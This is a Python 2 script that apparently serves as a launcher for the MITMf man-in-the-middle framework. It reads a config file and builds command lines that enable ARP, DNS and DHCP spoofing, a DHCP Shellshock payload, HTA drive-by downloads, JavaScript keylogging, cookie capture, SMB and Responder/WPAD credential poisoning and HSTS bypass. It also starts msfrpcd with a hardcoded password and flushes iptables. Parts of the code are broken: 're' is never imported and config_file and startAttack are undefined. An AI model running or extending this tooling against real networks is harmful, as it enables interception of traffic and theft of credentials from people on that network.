import socket, os, sys, operator, netifaces, subprocess, threading, termcolor
from termcolor import colored

def bash_cmd(cmd):
    commands = cmd.splitlines()
    for c in commands:
        command = str(c.encode('utf-8')).strip().rstrip()
        subprocess.call(command,shell=True,executable='/bin/bash')
    return

def get_gw():
    # for a nethunter device without a mobile connection, the key is 'default'
    gws = netifaces.gateways()
    # gateway_ip = gws['default'][netifaces.AF_INET][0]
    # interface = gws['default'][netifaces.AF_INET][1]
    # Otherwise, it's [2] because 'default' is the cell phone's rndis0 interface that doesnt have a gateway, and therefore will throw errors
    gateway_ip = gws['default'][netifaces.AF_INET][0]
    interface = gws['default'][netifaces.AF_INET][1]
    gw = gateway_ip
    return gw
def readToLines(config_file):
    r = popen_background("cat mitmf.cfg  | grep -vi \#")
    # print str(r)
    l = r.splitlines()
    return l

def getProxyARPiface1(config_file):
    lines = readToLines(config_file)
    for line in lines:
        if re.search("NETIFACE_ONE",line):
            i = line.split(" = ")
            iface1 = str(i[1])
    return iface1

def getProxyARPiface2(config_file):
    lines = readToLines(config_file)
    for line in lines:
        if re.search("NETIFACE_TWO",line):
            i = line.split(" = ")
            iface2 = str(i[1])
    return iface2

def togglePARPDebugMode(lines, c):
    for line in lines:
        if re.search("PARP_DEBUG_MODE",line):
            i = line.split(" = ")
            if i[1] == "1":
                c = c + " -d"
                print str(c)
            else:
                pass
    return c
def startProxyARP(cmd):
    lines = readToLines(config_file)
    c = "parprouted"
    iface1 = getProxyARPiface1(config_file)
    iface2 = getProxyARPiface2(config_file)
    c = togglePARPDebugMode(lines, c)
    for line in lines:
        if re.search("PROXY_ARP_MODE", line):
            s = line.split(" = ")
            if s[1] == "1":
                c = c + " {} {} &".format(str(iface1),str(iface2))
                bash_cmd(c)
                print str(c)
    return cmd
def readConfig(config_file):
    cmd = "mitmf"
    # f = open(config_file,'r')
    # r = f.read()
    # l = r.splitlines()
    r = popen_background("cat mitmf.cfg  | grep -vi \#")
    # print str(r)
    l = r.splitlines()
    for line in l:
        if re.search("INTERFACE", line):
            s = line.split(" = ")
            iface = s[1]
            cmd = cmd + " -i {}".format(str(iface))
            print cmd
        if re.search("INJECT", line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --inject"
        if re.search("JS_URL", line):
            s = line.split(" = ")
            if s[1] != "":
                cmd = cmd + " --js-url {}".format(str(s[1]))
        if re.search("HTML_URL",line):
            s = line.split(" = ")
            if s[1] != "":
                cmd = cmd + " --html-url {}".format(str(s[1]))
        if re.search("HTA_DRIVEBY",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --hta"
        if re.search("HTA_TEXT",line):
            s = line.split(" = ")
            if s[1] != "":
                cmd = cmd + " --text {}".format(str(s[1]))
        if re.search("HTA_APP",line):
            s = line.split(" = ")
            if s[1] != "":
                cmd = cmd + " --hta-app {}".format(str(s[1]))
        if re.search("SPOOF",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --spoof"
        if re.search("SPOOF_TYPE",line):
            s = line.split(" = ")
            if s[1] != "":
                if s[1] == "ARP":
                    cmd = cmd + " --arp"
                    for line in l:
                        if re.search("ARP_MODE",line):
                            s = line.split(" = ")
                            amode = "rep"
                            if s[1] == "REQUEST":
                                amode = "req"
                                cmd = cmd + " --arpmode {}".format(str(amode))
                            if s[1] == "REPLY":
                                amode = "rep"
                                cmd = cmd + " --arpmode {}".format(str(amode))
                if s[1] == "DNS":
                    cmd = cmd + " --dns"
                if s[1] == "DHCP":
                    cmd = cmd + " --dhcp"
                    for line in l:
                        if re.search("DHCP_SHELLSHOCK_PAYLOAD",line):
                            s = line.split(" = ")
                            cmd = cmd + " --shellshock {}".format(str(s[1]))
                if s[1] == "ICMP":
                    cmd = cmd + " --icmp"
        if re.search("AUTO_ACQUIRE_GATEWAY",line):
            s = line.split(" = ")
            if s[1] == "1":
                gw = userSelectGateway()
                cmd = cmd + " --gateway {}".format(str(gw))
            else:
                for line in l:
                    if re.search("SPOOF_GATEWAY",line):
                        s = line.split(" = ")
                        if s[1] != "":
                            cmd = cmd + " --gateway {}".format(str(s[1]))
                    if re.search("SPOOF_GATEWAY_MAC",line):
                        s = line.split(" = ")
                        if s[1] != "":
                            cmd = cmd + " --gatewaymac {}".format(str(s[1]))
        if re.search("SPOOF_TARGET",line):
            s = line.split(" = ")
            if s[1] != "":
                cmd = cmd + " --targets {}".format(str(s[1]))
        if re.search("APP_POISON",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --appoison"
        if re.search("UPSIDEDOWN_INTERNET",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --upsidedownternet"
        if re.search("BROWSER_PROFILER",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --browserprofiler"
        if re.search("FILEPWN",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --filepwn"
        if re.search("SMB_AUTH",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --smbauth"
        if re.search("FERRET_NG",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --ferretng"
        if re.search("FERRET_NG_PORT",line):
            s = line.split(" = ")
            if s[1] != "":
                cmd = cmd + " --port {}".format(str(s[1]))
        if re.search("FERRET_NG_COOKIES",line):
            s = line.split(" = ")
            if s[1] != "":
                cmd = cmd + " --load-cookies {}".format(str(s[1]))
        if re.search("BROWSER_SNIPER",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --browsersniper"
        if re.search("JS_KEYLOGGER",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --jskeylogger"
        if re.search("""REPLACE""",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --replace"
        if re.search("HSTS",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --hsts"
        if re.search("RESPONDER_PLUGIN",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --responder"
        if re.search("RESPONDER_ANALYZE",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --analyze"
        if re.search("RESPONDER_WREDIR",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --wredir"
        if re.search("RESPONDER_NBTNS",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --nbtns"
        if re.search("RESPONDER_FINGERPRINT",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --fingerprint"
        if re.search("RESPONDER_LM",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --lm"
        if re.search("RESPONDER_WPAD",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --wpad"
        if re.search("RESPONDER_FORCE_WPADAUTH",line):
            s = line.split(" = ")
            if s[1] == "1":
                cmd = cmd + " --forcewpadauth"
    cmd = startProxyARP(cmd)
    print str(cmd)
    startAttack(cmd)
    return cmd

def startMsfrpcd():
    bash_cmd("msfrpcd -U msf -P abc123 -a 127.0.0.1 -p 55552")
    return
def userSelectGateway():
    gws = netifaces.gateways()
    gwDict = {}
    counter = 1
    for gw in gws:
        # print "DEBUG Index = ", str(gw)
        gateway_ip = gws[netifaces.AF_INET][0][0]
        # interface = gws[gw][netifaces.AF_INET][1]
        gwDict[counter] = gateway_ip
        counter += 1

    print "Detected Gateways on ALL of your network interfaces", gwDict
    # counter = 1
    # for opt in gwDict:
    #     print "TARGET: ", str(counter), "GATEWAY: ", gw[counter]
    #     counter += 1
    print "Select a GATEWAY to spoof against"
    userInput = int(raw_input("Enter a OPTION: "))
    gw = gwDict[userInput]
    print "Gateway Selected: ", str(gw)
    return gw
def readUserInput(inputFile):
    f = open(inputFile, 'r')
    r = f.read()
    s = str(r.encode('utf-8')).strip().rstrip()
    string = s
    return string

def menu_parser(menu):
    # options_list = {}
    menu = str(menu)
    menu = menu.splitlines()
    counter = 1
    for item in menu:
        option = str(item.encode('utf-8')).rstrip().strip()
        print '\t\t',str(counter),'\t\t\t',option
        # options_list[counter] = option
        counter += 1
    # print options_list
    return
def popen_background(cmd):
    p = subprocess.Popen(cmd, shell=True, executable='/bin/bash', stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    o = p.stdout.read()
    e = p.stderr.read()
    o = str(o.encode('utf-8')).strip().rstrip()
    e = str(e.encode('utf-8')).strip().rstrip()
    output = o + e
    return output

def clean_iptables():
    commands = """iptables --policy INPUT ACCEPT
iptables --policy FORWARD ACCEPT
iptables --policy OUTPUT ACCEPT
iptables -t nat -F"""
    bash_cmd(commands)
    return
